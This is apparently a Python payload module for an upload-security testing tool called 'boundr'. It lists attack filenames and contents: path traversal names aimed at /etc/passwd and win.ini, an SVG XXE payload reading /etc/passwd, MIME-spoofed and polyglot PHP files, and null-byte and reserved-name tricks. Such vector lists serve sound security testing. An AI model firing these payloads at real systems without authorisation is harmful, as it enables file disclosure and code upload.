# -*- coding: utf-8 -*-
# Filename and content attack vectors for boundr.

from typing import List, Tuple


# (filename, content_type, body_bytes, vector_tag)
def traversal_vectors() -> List[Tuple[str, str, bytes, str]]:
    body = b'boundr-traversal-probe'
    return [
        ('../../etc/passwd', 'text/plain', body, 'path_traversal'),
        ('..\\..\\windows\\win.ini', 'text/plain', body, 'path_traversal_win'),
        ('....//....//etc/passwd', 'text/plain', body, 'path_traversal_dotdot'),
        ('/tmp/boundr_escape.txt', 'text/plain', body, 'absolute_path'),
        ('uploads/../../../tmp/boundr_escape.txt', 'text/plain', body, 'nested_traversal'),
    ]


def mime_vectors() -> List[Tuple[str, str, bytes, str]]:
    # PNG magic with .php / .html extension — MIME spoof
    png_magic = b'\x89PNG\r\n\x1a\n' + b'\x00' * 16
    svg_xxe = (
        b'<?xml version="1.0"?>'
        b'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        b'<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'
    )
    return [
        ('shell.php', 'image/png', png_magic, 'mime_spoof_php'),
        ('page.html', 'image/jpeg', b'\xff\xd8\xff\xe0' + b'JFIF', 'mime_spoof_html'),
        ('xxe.svg', 'image/svg+xml', svg_xxe, 'svg_xxe'),
        ('polyglot.jpg.php', 'image/jpeg', png_magic + b'<?php echo 1;?>', 'polyglot'),
    ]


def size_vectors() -> List[Tuple[str, str, bytes, str]]:
    return [
        ('empty.bin', 'application/octet-stream', b'', 'empty_file'),
        ('oversized.bin', 'application/octet-stream', b'A' * (2 * 1024 * 1024), 'oversized_2mb'),
        ('huge_name_' + ('x' * 240) + '.txt', 'text/plain', b'small', 'oversized_filename'),
    ]


def reserved_name_vectors() -> List[Tuple[str, str, bytes, str]]:
    body = b'boundr-reserved'
    return [
        ('CON.txt', 'text/plain', body, 'reserved_con'),
        ('nul', 'text/plain', body, 'reserved_nul'),
        ('file\x00.txt', 'text/plain', body, 'null_byte'),
        ('file%00.txt', 'text/plain', body, 'null_byte_encoded'),
    ]


def baseline_vector(field: str = 'file') -> Tuple[str, str, bytes, str]:
    return ('boundr_probe.txt', 'text/plain', b'boundr-baseline-ok', 'baseline')


def select_vectors(mode: str) -> List[Tuple[str, str, bytes, str]]:
    mode = (mode or 'all').lower()
    vectors: List[Tuple[str, str, bytes, str]] = [baseline_vector()]

    if mode in ('all', 'traversal'):
        vectors.extend(traversal_vectors())
    if mode in ('all', 'mime'):
        vectors.extend(mime_vectors())
    if mode in ('all', 'size'):
        vectors.extend(size_vectors())
    if mode in ('all', 'reserved'):
        vectors.extend(reserved_name_vectors())
    if mode not in ('all', 'traversal', 'mime', 'size', 'reserved'):
        # unknown mode — run all
        vectors = [baseline_vector()]
        vectors.extend(traversal_vectors())
        vectors.extend(mime_vectors())
        vectors.extend(size_vectors())
        vectors.extend(reserved_name_vectors())

    return vectors
